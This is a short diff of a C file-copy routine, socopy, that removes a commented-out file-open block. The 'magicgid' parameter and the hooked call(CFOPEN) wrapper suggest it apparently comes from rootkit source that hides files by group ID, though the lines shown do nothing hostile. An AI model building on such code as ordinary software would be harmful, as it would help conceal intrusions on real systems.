@@ -55,12 +55,6 @@ int socopy(const char *opath, char *npath, gid_t magicgid){
     ofp = bindup(opath, npath, &nfp, &fsize, &somode);
     if(ofp == NULL) return -1;
 
-    //nfp = call(CFOPEN, npath, "wb");
-    //if(nfp == NULL){
-    //    fclose(ofp);
-    //    return -1;
-    //}
-
     blksize = getablocksize(fsize);
     do{
         buf = malloc(blksize+1);
